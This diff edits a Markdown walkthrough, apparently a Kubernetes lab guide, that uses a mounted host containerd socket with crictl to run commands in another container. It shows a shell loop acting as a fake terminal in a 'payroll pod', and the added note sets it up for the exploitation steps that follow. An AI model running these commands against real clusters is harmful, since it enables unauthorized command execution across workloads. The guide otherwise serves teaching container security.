@@ -168,7 +168,7 @@ curl -LO https://github.com/kubernetes-sigs/cri-tools/releases/download/v1.31.1/
 tar Cxzvf /tmp crictl-v1.31.1-linux-amd64.tar.gz
 ```
 
-Next, we can configure `crictl`, using the containerd socket we found:
+Next, we can configure `crictl`, using the attack exploit on the containerd socket we found:
 
 ```sh
 MOUNTED_SOCK_PATH=/host/run/containerd/containerd.sock 
@@ -206,6 +206,10 @@ Next, we can rig up a fake "terminal" by using a while loop:
 ```sh
 while true; do echo -n "$ "; read -r CMD || break; cc exec -sit $CTR bash -c "$CMD"; done; echo
 ```
+
+> **Note:**
+>
+> Keep this fake terminal running for the next exploitation steps, as they assume you are running each command in the payroll pod.
 
 ### Exploitation
 
